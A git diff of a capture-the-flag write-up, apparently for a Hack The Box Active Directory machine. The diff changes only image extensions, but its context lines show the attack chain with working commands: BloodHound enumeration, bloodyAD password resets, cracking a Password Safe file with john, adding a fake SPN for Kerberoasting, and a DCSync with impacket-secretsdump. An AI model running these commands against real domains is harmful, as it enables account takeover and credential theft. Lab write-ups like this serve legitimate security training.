@@ -61,7 +61,7 @@ Nmap done: 1 IP address (1 host up) scanned in 33.71 seconds
 
 I tried connecting to FTP with `Olivia`'s credentials but it didn't work.
 
-![FTP login attempt with Olivia's credentials failing](/images/administrator/1.png)
+![FTP login attempt with Olivia's credentials failing](/images/administrator/1.webp)
 
 I ran bloodhound-python and uploaded the zip to the BloodHound GUI:
 
@@ -71,7 +71,7 @@ bloodhound-python -ns 10.129.36.47 -u Olivia -p ichliebedich -c All -d administr
 
 After digging I ended up with this path:
 
-![BloodHound path from olivia to michael to benjamin](/images/administrator/2.png)
+![BloodHound path from olivia to michael to benjamin](/images/administrator/2.webp)
 
 So first I changed `michael`'s password:
 
@@ -79,7 +79,7 @@ So first I changed `michael`'s password:
 bloodyad --host 10.129.36.47 -d administrator.htb -u olivia -p 'ichliebedich' set password michael 'Password123!'
 ```
 
-![Changing michael's password with bloodyAD](/images/administrator/3.png)
+![Changing michael's password with bloodyAD](/images/administrator/3.webp)
 
 And with `michael`'s account I changed the password for `benjamin`:
 
@@ -87,15 +87,15 @@ And with `michael`'s account I changed the password for `benjamin`:
 bloodyad --host 10.129.36.47 -d administrator.htb -u michael -p 'Password123!' set password benjamin 'Password123!'
 ```
 
-![Changing benjamin's password with bloodyAD](/images/administrator/4.png)
+![Changing benjamin's password with bloodyAD](/images/administrator/4.webp)
 
 I checked what `benjamin` can do and it turns out he is a member of `Share Moderators`, so as we might remember from the nmap scan, there is an FTP service running.
 
-![benjamin is a member of Share Moderators](/images/administrator/5.png)
+![benjamin is a member of Share Moderators](/images/administrator/5.webp)
 
 So I logged in to FTP and saw a `Backup.psafe3` file:
 
-![Backup.psafe3 downloaded over FTP](/images/administrator/6.png)
+![Backup.psafe3 downloaded over FTP](/images/administrator/6.webp)
 
 I converted this file to a hash:
 
@@ -109,19 +109,19 @@ And cracked it using `john`:
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 
-![John cracking the Password Safe master password](/images/administrator/8.png)
+![John cracking the Password Safe master password](/images/administrator/8.webp)
 
 Next I ran `pwsafe` to open that safe and entered the master password: `tekieromucho`
 
-![Opening the safe in pwsafe with the master password](/images/administrator/9.png)
+![Opening the safe in pwsafe with the master password](/images/administrator/9.webp)
 
 I saw 3 users, `alexander`, `emily` and `emma`, and had their passwords.
 
-![Three stored user entries inside the safe](/images/administrator/10.png)
+![Three stored user entries inside the safe](/images/administrator/10.webp)
 
 In BloodHound I saw that `emily` has `GenericWrite` over `ethan`.
 
-![BloodHound showing emily with GenericWrite over ethan](/images/administrator/11.png)
+![BloodHound showing emily with GenericWrite over ethan](/images/administrator/11.webp)
 
 I added an SPN to `ethan`:
 
@@ -129,7 +129,7 @@ I added an SPN to `ethan`:
 bloodyad --host 10.129.36.47 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' set object ethan servicePrincipalName -v 'fake/svc'
 ```
 
-![Setting a fake SPN on ethan with bloodyAD](/images/administrator/12.png)
+![Setting a fake SPN on ethan with bloodyAD](/images/administrator/12.webp)
 
 And performed Kerberoasting on `ethan`:
 
@@ -137,7 +137,7 @@ And performed Kerberoasting on `ethan`:
 impacket-GetUserSPNs -dc-ip 10.129.36.47 administrator.htb/emily -request-user ethan -outputfile kerb.txt
 ```
 
-![Requesting ethan's TGS with GetUserSPNs](/images/administrator/13.png)
+![Requesting ethan's TGS with GetUserSPNs](/images/administrator/13.webp)
 
 Then cracked his TGS:
 
@@ -145,17 +145,17 @@ Then cracked his TGS:
 john --wordlist=/usr/share/wordlists/rockyou.txt kerb.txt
 ```
 
-![John cracking ethan's TGS](/images/administrator/14.png)
+![John cracking ethan's TGS](/images/administrator/14.webp)
 
 `ethan` can perform DCSync so we did just that.
 
-![BloodHound showing ethan with DCSync rights over the domain](/images/administrator/15.png)
+![BloodHound showing ethan with DCSync rights over the domain](/images/administrator/15.webp)
 
 ```bash
 impacket-secretsdump 'administrator.htb/ethan:limpbizkit@10.129.36.47' -just-dc-user administrator
 ```
 
-![secretsdump returning the administrator NT hash](/images/administrator/16.png)
+![secretsdump returning the administrator NT hash](/images/administrator/16.webp)
 
 Now it's basically over, and I just realised I forgot to take `user.txt`
 
